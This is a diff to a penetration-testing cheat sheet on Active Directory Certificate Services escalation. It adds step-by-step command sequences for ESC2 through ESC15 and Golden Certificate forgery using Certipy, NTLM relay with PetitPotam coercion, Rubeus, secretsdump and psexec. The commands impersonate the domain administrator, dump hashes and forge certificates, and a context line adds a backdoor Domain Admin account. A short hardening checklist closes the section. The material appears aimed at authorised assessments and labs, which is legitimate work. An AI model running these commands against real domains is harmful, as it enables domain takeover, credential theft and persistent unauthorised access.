@@ -1534,20 +1534,16 @@ net group "Domain Admins" backdoor /add /domain
 
 
 ---
-
 ## 17. ADCS — Active Directory Certificate Services
-
-> **Concept:** ADCS is one of the most impactful modern AD attack surfaces. Misconfigured certificate templates allow low-privileged users to request certificates that enable authentication as any domain user, including Domain Admins. The tool `Certipy` (Linux) and `Certify` (Windows) are the standard tools. ESC1–ESC8 are the core escalation paths — ESC1 and ESC3 are the most commonly found in real assessments.
+> **Concept:** ADCS is one of the most impactful modern AD attack surfaces. Misconfigured certificate templates allow low-privileged users to request certificates that enable authentication as any domain user, including Domain Admins. The tool `Certipy` (Linux) and `Certify` (Windows) are the standard tools. ESC1–ESC16 cover the known escalation paths — ESC1, ESC3, ESC4, and ESC9 are the most commonly found in real assessments and HTB boxes.
 
 ### Enumerate with Certipy (Linux)
 ```bash
 # Install
 pip3 install certipy-ad
-
 # Find vulnerable templates
 certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP>
 certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -vulnerable -stdout
-
 # Full BloodHound-compatible output
 certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -bloodhound
 ```
@@ -1557,7 +1553,6 @@ certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -bloodhound
 # Find all vulnerable templates
 .\Certify.exe find /vulnerable
 .\Certify.exe find /vulnerable /currentuser
-
 # List all CAs
 .\Certify.exe cas
 ```
@@ -1569,7 +1564,6 @@ certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -bloodhound
 certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
   -target <CA_HOST> -ca <CA_NAME> -template <VULN_TEMPLATE> \
   -upn administrator@corp.com
-
 # Authenticate with the cert → get NTLM hash / TGT
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 # → dumps NTLM hash + TGT for administrator
@@ -1580,46 +1574,79 @@ certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 .\Rubeus.exe asktgt /user:administrator /certificate:<base64_pfx> /password:abc /ptt
 ```
 
+### ESC2 — Any Purpose EKU
+> **When:** Template has the "Any Purpose" EKU or no EKU restrictions at all. Behaves like ESC1 but the cert can be used for any purpose, including as a subordinate CA cert in some cases. Same exploitation as ESC1 if SAN is also enrollee-suppliable — otherwise chain into ESC3-style agent abuse or code signing / smart card logon depending on what's needed.
+```bash
+certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
+  -target <CA_HOST> -ca <CA_NAME> -template <ANY_PURPOSE_TEMPLATE> \
+  -upn administrator@corp.com
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
 ### ESC3 — Enrollment Agent Abuse
 > **When:** A template grants Certificate Request Agent rights. Attacker enrolls as agent, then requests a cert on behalf of any user.
 ```bash
 # Step 1: Get enrollment agent cert
 certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
   -target <CA_HOST> -ca <CA_NAME> -template <AGENT_TEMPLATE>
-
 # Step 2: Use agent cert to request on-behalf-of DA
 certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
   -target <CA_HOST> -ca <CA_NAME> -template User \
   -on-behalf-of corp\\administrator -pfx agent.pfx
-
 # Authenticate
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
 ### ESC4 — Writable Template ACL
-> **When:** User has write access over a certificate template object in AD — modify it to become ESC1.
+> **When:** User has write access (GenericAll/GenericWrite/WriteOwner/WriteDacl) over a certificate template object in AD — modify it to become ESC1. Confirmed real syntax below (`-save-old` is NOT a valid flag in current Certipy — verify with `certipy template -h`).
 ```bash
-# Overwrite template to be vulnerable (saves original)
+# Overwrite template with Certipy's default ESC1-vulnerable config (auto-backs-up original first)
 certipy template -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
-  -template <TEMPLATE_NAME> -save-old
-
+  -template <TEMPLATE_NAME> -write-default-configuration
 # Now exploit as ESC1
 certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
   -target <CA_HOST> -ca <CA_NAME> -template <TEMPLATE_NAME> \
   -upn administrator@corp.com
-
-# Restore original template
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+# Restore original template from the auto-saved backup JSON
 certipy template -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
-  -template <TEMPLATE_NAME> -configuration <TEMPLATE_NAME>.json
+  -template <TEMPLATE_NAME> -write-configuration <TEMPLATE_NAME>.json
+```
+
+### ESC5 — Vulnerable PKI Object Access Control
+> **When:** Attacker has control over a PKI-adjacent AD object other than the template itself — e.g. the CA computer object, the `CN=Public Key Services` container, or an OID/issuance-policy object. Effectively a generalization of ESC4 to the broader PKI object hierarchy. Abuse depends on the specific object controlled — commonly used to grant yourself rights that lead into ESC4 or ESC7.
+```bash
+# Enumerate ACLs across the whole PKI container tree via BloodHound
+bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All
+# Then in BloodHound Cypher, look for control edges into CN=Public Key Services objects
 ```
 
 ### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA Flag
-> **When:** CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows SAN in any template request.
+> **When:** CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows SAN in any template request, regardless of template settings. Patched by default since May 2022 updates (CA now enforces `CT_FLAG_NO_SECURITY_EXTENSION` checks separately), but still found on unpatched CAs.
 ```bash
+# Check the flag is set (shown in `certipy find` CA output)
+certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -stdout
 # Any template becomes ESC1-like
 certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
   -target <CA_HOST> -ca <CA_NAME> -template User \
   -upn administrator@corp.com
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+### ESC7 — Vulnerable Certificate Authority Access Control
+> **When:** Attacker-controlled principal holds `ManageCA` or `ManageCertificates` rights directly on the CA object (not a template). `ManageCA` lets you enable the ESC6 flag or add yourself `ManageCertificates`; `ManageCertificates` alone lets you approve pending certificate requests — combine with a template requiring manager approval to self-approve a malicious request.
+```bash
+# Check current CA permissions
+certipy find -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -stdout
+# If you have ManageCA: grant yourself ManageCertificates too
+certipy ca -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -add-officer <USER>
+# Request a cert on a template requiring manager approval (fails, stays pending)
+certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -target <CA_HOST> -ca <CA_NAME> -template <APPROVAL_TEMPLATE> -upn administrator@corp.com
+# Approve your own pending request using ManageCertificates rights (use the Request ID from above)
+certipy ca -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -issue-request <REQUEST_ID>
+# Retrieve the now-issued cert
+certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> -target <CA_HOST> -ca <CA_NAME> -retrieve <REQUEST_ID>
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
 ### ESC8 — NTLM Relay to AD CS HTTP Endpoint
@@ -1628,10 +1655,8 @@ certipy req -u <USER>@corp.com -p <PASS> -dc-ip <DC_IP> \
 # Step 1: Start relay targeting the CA web enrollment
 impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp \
   -smb2support --adcs --template DomainController
-
 # Step 2: Coerce DC auth (PetitPotam / Coercer)
 python3 PetitPotam.py -u <USER> -p <PASS> <LHOST> <DC_IP>
-
 # Step 3: Use the b64 cert from ntlmrelayx output
 certipy auth -pfx dc.pfx -dc-ip <DC_IP>
 # → DC machine account hash → DCSync
@@ -1642,40 +1667,94 @@ certipy auth -pfx dc.pfx -dc-ip <DC_IP>
 ```bash
 # [lin] Identify ESC9-vulnerable templates
 certipy find -u <USER>@<DOMAIN> -hashes <HASH> -dc-ip <IP> -vulnerable -stdout
-
 # [lin] Obtain the enrolling account's NT hash (shadow credentials attack, abusing your write access)
 certipy shadow auto -u <USER>@<DOMAIN> -hashes <HASH> -account <TARGET_USER> -dc-ip <IP>
-
 # [lin] Change that account's own userPrincipalName to the identity you want to impersonate
 certipy account update -u <USER>@<DOMAIN> -hashes <HASH> -user <TARGET_USER> -upn <UPN> -dc-ip <IP>
-
 # [lin] Request a certificate as that account through the vulnerable template — cert now carries UPN=<UPN>
 certipy req -u <TARGET_USER>@<DOMAIN> -hashes <TARGET_HASH> -ca <CA> -template <TEMPLATE> -dc-ip <IP>
-
 # [lin] Revert the UPN back to its original value (cleanup)
 certipy account update -u <USER>@<DOMAIN> -hashes <HASH> -user <TARGET_USER> -upn <TARGET_USER> -dc-ip <IP>
-
 # [lin] Authenticate with the resulting .pfx — DC resolves identity from the UPN embedded in the cert
 certipy auth -pfx <UPN>.pfx -domain <DOMAIN> -dc-ip <IP>
-
 # [lin] Use the returned NT hash for full domain compromise
 evil-winrm -i <IP> -u <UPN> -H <TARGET_HASH>
 ```
 
+### ESC10 — Weak Certificate Mapping (Case 1 / Case 2)
+> **When:** Similar root cause to ESC9 but exploited via `StrongCertificateBindingEnforcement` registry value directly rather than a template flag. Case 1: cert mapped to any account matching the SAN/UPN when enforcement is disabled. Case 2: attacker modifies their own `altSecurityIdentities` or the target account's UPN/DNS attribute to match a cert they already control.
+```bash
+# Check StrongCertificateBindingEnforcement value via certipy find output ("Strong Certificate Mapping")
+certipy find -u <USER>@<DOMAIN> -hashes <HASH> -dc-ip <IP> -vulnerable -stdout
+# Same UPN-manipulation technique as ESC9 if Case 1 applies
+certipy account update -u <USER>@<DOMAIN> -hashes <HASH> -user <TARGET_USER> -upn administrator -dc-ip <IP>
+certipy req -u <TARGET_USER>@<DOMAIN> -hashes <TARGET_HASH> -ca <CA> -template User -dc-ip <IP>
+certipy auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <IP>
+```
+
+### ESC11 — NTLM Relay to ICPR RPC Endpoint
+> **When:** Like ESC8 but relays over the unencrypted RPC (ICertPassage) interface instead of HTTP, exploitable when `IF_ENFORCEENCRYPTICERTREQUEST` is not set on the CA.
+```bash
+# Check via certipy find output for "Enforce Encryption for Requests: Disabled"
+certipy find -u <USER>@<DOMAIN> -hashes <HASH> -dc-ip <IP> -stdout
+# Relay via RPC instead of HTTP
+impacket-ntlmrelayx -t rpc://<CA_HOST> -rpc-mode ICPR -icpr-ca-name <CA_NAME> --template DomainController
+python3 PetitPotam.py -u <USER> -p <PASS> <LHOST> <DC_IP>
+certipy auth -pfx dc.pfx -dc-ip <DC_IP>
+```
+
+### ESC13 — Issuance Policy Linked to Privileged Group
+> **When:** A certificate template's issuance policy OID is linked (via `msDS-OIDToGroupLink`) to a privileged AD group. Enrolling in that template grants group-equivalent access through the issued cert, regardless of the requester's actual group membership.
+```bash
+certipy find -u <USER>@<DOMAIN> -hashes <HASH> -dc-ip <IP> -vulnerable -stdout
+# Look for "OIDs linked to templates" in the output pointing to a privileged group
+certipy req -u <USER>@<DOMAIN> -hashes <HASH> -ca <CA> -template <ESC13_TEMPLATE> -dc-ip <IP>
+certipy auth -pfx <cert>.pfx -dc-ip <IP>
+```
+
+### ESC15 / EKUwu (CVE-2024-49019) — Arbitrary Application Policy Injection
+> **When:** V1 certificate templates (schema version 1) with client authentication allowed via legacy Application Policy extension, letting an attacker inject an arbitrary Application Policy OID (e.g. Client Authentication or Certificate Request Agent) into a request even when the template doesn't explicitly grant it. Patched in May 2024 CU, still common on unpatched CAs.
+```bash
+certipy find -u <USER>@<DOMAIN> -hashes <HASH> -dc-ip <IP> -vulnerable -stdout
+# Inject Client Authentication application policy into a V1 template request
+certipy req -u <USER>@<DOMAIN> -hashes <HASH> -ca <CA> -template <V1_TEMPLATE> \
+  -application-policies "Client Authentication" -upn administrator@<DOMAIN> -dc-ip <IP>
+certipy auth -pfx administrator.pfx -dc-ip <IP>
+```
+
+### Golden Certificate — CA Private Key Compromise
+> **When:** You obtain the CA server's own private key/certificate (e.g. via `certipy ca -backup`, local admin on the CA server, or DPAPI extraction). Lets you forge arbitrary valid certificates for any user offline, indefinitely, without touching the CA again — persistence at the PKI trust root itself.
+```bash
+# From local admin/SYSTEM on the CA server, back up the CA's private key
+certipy ca -backup -ca <CA_NAME> -u <USER>@<DOMAIN> -hashes <HASH> -dc-ip <IP>
+# Forge a certificate for any user using the stolen CA key
+certipy forge -ca-pfx <CA_NAME>.pfx -upn administrator@<DOMAIN> -subject 'CN=Administrator,CN=Users,DC=corp,DC=com'
+certipy auth -pfx administrator.pfx -dc-ip <IP>
+```
 
 ### Post-Cert Authentication
 ```bash
 # Get TGT from PFX
 certipy auth -pfx <user>.pfx -dc-ip <DC_IP>
-
 # Pass-the-Hash with the extracted NT hash
 impacket-secretsdump -hashes :<NTHASH> corp.com/<USER>@<DC_IP>
 impacket-psexec -hashes :<NTHASH> administrator@<DC_IP>
-
 # Convert PFX for use with Rubeus [win]
 .\Rubeus.exe asktgt /user:<USER> /certificate:<b64pfx> /password:<pfxpass> /ptt
 ```
 
+### Hardening / Defensive Checklist
+```markdown
+- Set StrongCertificateBindingEnforcement=2 (Full) on all DCs (KB5014754) — fixes ESC9/ESC10
+- Remove CT_FLAG_NO_SECURITY_EXTENSION from all templates
+- Audit and restrict Enrollee Supplies Subject to only templates that truly need it — fixes ESC1
+- Restrict template ACLs (GenericAll/WriteOwner/WriteDacl) to Domain Admins/Enterprise Admins only — fixes ESC4/ESC5
+- Enable IF_ENFORCEENCRYPTICERTREQUEST and disable EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA — fixes ESC6/ESC11
+- Restrict ManageCA/ManageCertificates to a minimal trusted set, never combined on one account — fixes ESC7
+- Disable NTLM on the CA server / require HTTPS+EPA for web enrollment — fixes ESC8
+- Patch CVE-2024-49019 (May 2024 CU) — fixes ESC15
+- Run `certipy find -vulnerable` or Locksmith on a schedule, not just during engagements
+```
 ---
 
 ## 18. AD Delegation Attacks
